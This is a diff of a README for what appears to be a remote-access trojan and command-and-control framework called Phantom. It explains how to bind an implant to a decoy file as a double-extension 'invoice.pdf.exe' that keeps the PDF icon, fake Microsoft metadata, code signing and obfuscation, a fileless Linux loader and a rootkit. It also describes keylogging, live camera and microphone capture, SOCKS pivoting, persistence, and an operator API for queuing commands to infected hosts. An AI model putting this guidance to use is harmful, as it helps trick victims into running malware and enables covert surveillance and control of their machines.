@@ -70,13 +70,14 @@ template: [`.env.example`](.env.example).
 | `PHANTOM_PORT` | `80` | Listen port, keep it in sync with *Ports Exposes* |
 | `PHANTOM_TLS` | `false` | Keep off — the proxy terminates TLS |
 | `PHANTOM_LOG` | `info` | Uvicorn log level |
+| `PHANTOM_SEED` | `0` | `>0` seeds that many synthetic hosts for a first look |
 | `PHANTOM_DATA` / `PHANTOM_BUILDS` | `/data`, `/data/builds` | Keep on the volume (`PHANTOM_DATA` must stay `/data`, the compose volume target is static) |
 | `PHANTOM_VENDOR` | `Microsoft Corporation` | PE metadata company on artifacts |
 | `PHANTOM_ENCRYPT` / `PHANTOM_METADATA` | `true` | Seal the embedded implant / apply metadata + icon |
 | `PHANTOM_GARBLE` / `PHANTOM_UPX` | `false` | Obfuscation / compression, requires `INSTALL_GARBLE=1` / `INSTALL_UPX=1` build arg |
 | `PHANTOM_SIGN_PFX` / `PHANTOM_SIGN_PASS` | *(empty)* | Authenticode-sign every artifact |
 | `PHANTOM_SOCKS`, `PHANTOM_SOCKS_HOST`, `PHANTOM_SOCKS_PORT` | `true`, `127.0.0.1`, `1080` | SOCKS pivot listener |
-| `PHANTOM_CERT` / `PHANTOM_KEY` | `/app/server/certs/server.{crt,key}` | Only used when `PHANTOM_TLS=true` |
+| `PHANTOM_CERT` / `PHANTOM_KEY` | `/app/server/certs/server.{crt,key}` | Only used when `PHANTOM_TLS=true` (repo ships a self-signed dev pair) |
 
 The container compiles payloads on demand: keep the `/data` volume (without it a
 redeploy rotates the PSK and breaks every bot built before) and give it ~1.5 GB RAM.
@@ -233,26 +234,67 @@ cd server && python3 server.py
 Then open `http://127.0.0.1:8000`. Run `python3 server/gen_certs.py` and set
 `PHANTOM_TLS=true` if you need TLS on the C2 itself.
 
+### Self-checks
+
+```sh
+# seeded instance for the UI smoke test (Playwright + Chromium required)
+PHANTOM_SEED=5 PHANTOM_AUTH=admin:secret PHANTOM_SOCKS=false \
+  PHANTOM_DATA=.tmp/uidata PHANTOM_BUILDS=.tmp/uidata/builds \
+  python3 server/server.py &
+python3 tools/uicheck.py http://127.0.0.1:8000 admin:secret .tmp/shots
+
+python3 tools/verify.py build/invoice.pdf.exe   # footer, decoy, seal, PE magic
+python3 tools/harness.py                        # repack + run a binding with debug output
+pwsh ./tools/coolify-validate.ps1               # validate docker-compose.yml
+```
+
+`uicheck.py` walks every view and host pane, screenshots it and exits non-zero
+on a console error, a failed request or horizontal overflow.
+
+---
+
+## The dashboard
+
+The console is a dependency-free ES-module SPA served by the same process. Log in
+at `/login` with the generated credentials; the session is an httpOnly cookie
+(7 days when *keep me signed in* is ticked) and `?token=<password>` links still
+work for scripts.
+
+| View | What it is for |
+| --- | --- |
+| **Overview** | Fleet health: online/idle/stale counts, queue pressure, event sparkline, platform mix, one-click broadcasts |
+| **Fleet** | Every host with derived presence, filters, sorting, tags, multi-select and a bulk command bar |
+| **Host** | Per-target workspace: console, file browser, processes, keylogger, camera/mic, network scan, SOCKS, spread, persistence, rootkit, profile |
+| **Payloads** | Bind a decoy or emit a raw implant, plus the artifact list |
+| **Activity** | Audit trail of joins, drops, commands, files and builds |
+| **Environment** | Callback URL, PSK hint, build profile, live counters, capability matrix |
+
+Presence, queue state and stream flags are pushed over `/ws`; a host is only
+"online" while its next beacon window is still open, so the UI never shows a
+dead session as alive. Keyboard: `Ctrl/⌘ K` palette, `/` filter the fleet,
+`g` + `o/f/p/a/e` jump, `?` shortcut sheet, `Esc` close overlays.
+
 ---
 
 ## Using the builder
 
-1. Open **Builder**.
+1. Open **Payloads**.
 2. Drop the decoy file (invoice.pdf, contract.docx, photo.jpg …).
 3. The callback URL is filled automatically from the request header
-   (`X-Forwarded-Host` → public IP → LAN IP). Press **auto** to refresh.
+   (`X-Forwarded-Host` → public IP → LAN IP). Press the refresh button to reset it.
 4. Choose platform/arch, sleep, jitter, optional start delay.
 5. **Bind & build** → download the artifact from *Artifacts*.
 
 The produced file is `name.pdf.exe` (double extension keeps the PDF icon while
 Windows still executes it). On launch the stub:
 
-* writes the decoy to `%TEMP%` and opens it with the shell association,
+* writes the decoy to `%LOCALAPPDATA%\<name>` and opens it with the shell
+  association,
 * drops the implant beside it and starts it detached — no console flash,
 * the implant then beacons to the configured URL.
 
 Linux/macOS bindings are `.run` files (`chmod +x` them); they behave the same
-using `xdg-open` / `open`.
+using `xdg-open` / `open` under `~/.cache` / `~/Library/Caches`.
 
 Toggle **document icon** off to ship a plain `.exe`, or use **build raw implant**
 for a bare binary, or **fileless .sh loader** for a memfd-only Linux payload.
@@ -264,8 +306,9 @@ for a bare binary, or **fileless .sh loader** for a memfd-only Linux payload.
 * **Live camera** and **live microphone** need `ffmpeg` on the target. Missing
   tools surface as a toast with the exact install hint. Devices are enumerated
   automatically (DirectShow / V4L2 / AVFoundation).
-* Camera frames land in the **Media** tab; the audio stream is decoded by Web
-  Audio at 16 kHz mono. Both stop with the matching `stop` / `mute` button.
+* Camera frames land in the host's **Camera & mic** pane and in its capture
+  gallery; the audio stream is decoded by Web Audio at 16 kHz mono and plotted
+  as a waveform. Both stop with the matching *stop* / *mute* button.
 * **SOCKS pivot**: run `socks` on a bot, then point tooling at `127.0.0.1:1080`
   (SSH tunnel or published port).
 * **Rootkit** (Linux) needs `phantom_rootkit.ko` built with `make -C rootkit`
@@ -294,26 +337,40 @@ osslsigncode sign -certs cert.pem -key key.pem -in in.exe -out out.exe
 
 ```
 implant/            Go beacon (cross platform) + stealth + live media
-server/             FastAPI C2, builder, binder stub, dashboard, crypto
+server/             FastAPI C2, builder, binder stub, crypto, tool catalogue
+server/static/      dashboard SPA (login, views, palette) + styles
 fileless/           memfd loader template
 rootkit/            Linux LKM
+front/              optional nginx TLS front for a bare VPS
 Dockerfile          Coolify-ready image
 docker-compose.yml  Coolify service definition (every setting = env var)
 .env.example        env template to paste into Coolify
-tools/              local helpers (incl. Coolify compose validator)
+tools/              local helpers (build verifier, UI smoke test, Coolify validator)
 ```
 
 ## API quick reference
 
+Everything except the ingest paths, `/login` and `/healthz` needs a session
+cookie, HTTP basic auth or `?token=<password>`.
+
 | Method | Path | Purpose |
 | --- | --- | --- |
-| `POST` | `/beacon` | encrypted beacon in/out |
-| `POST` | `/api/media/push` | camera / microphone frames from implants |
-| `GET` | `/api/config` | auto-detected callback URL and build limits |
+| `POST` | `/api/login` / `/api/logout` | cookie session in/out (rate limited) |
+| `GET` | `/api/me` | who the caller is and whether auth is on |
+| `GET` | `/api/sessions`, `/api/session/{id}` | fleet snapshot / one session |
+| `POST` | `/api/session/{id}/command` | queue a raw command |
+| `POST` | `/api/session/{id}/tool/{tool}` | queue a catalogue tool (validated) |
+| `GET` | `/api/session/{id}/timeline` | command history |
+| `GET` | `/api/session/{id}/files`, `…/processes`, `…/scan` | cached tool results |
+| `GET/POST` | `/api/session/{id}/keylog…` | keylog archive and start/stop/dump/clear |
+| `GET` | `/api/session/{id}/cam.mjpg`, `cam.jpg`, `mic.pcm` | live media streams |
+| `PATCH/DELETE` | `/api/session/{id}` | notes/tags/beacon timing, forget session |
+| `POST` | `/api/broadcast` | fan out a command |
+| `GET` | `/api/events`, `/api/stats`, `/api/tools` | audit trail, counters, tool catalogue |
 | `POST` | `/api/bind` | multipart bind (file + options) |
 | `POST` | `/api/build` | raw implant build |
-| `GET/DELETE` | `/api/builds…` | artifact management |
-| `POST` | `/api/session/{id}/command` | queue a command |
-| `POST` | `/api/broadcast` | fan out a command |
+| `GET/DELETE` | `/api/builds…`, `/api/blobs…` | artifact and capture management |
+| `GET` | `/ws` | live operator socket |
+| `POST` | `/beacon` | encrypted beacon in/out |
+| `POST` | `/api/media/push`, `/api/media/upload` | camera/mic frames and captures |
 | `GET` | `/healthz` | container health probe |
-
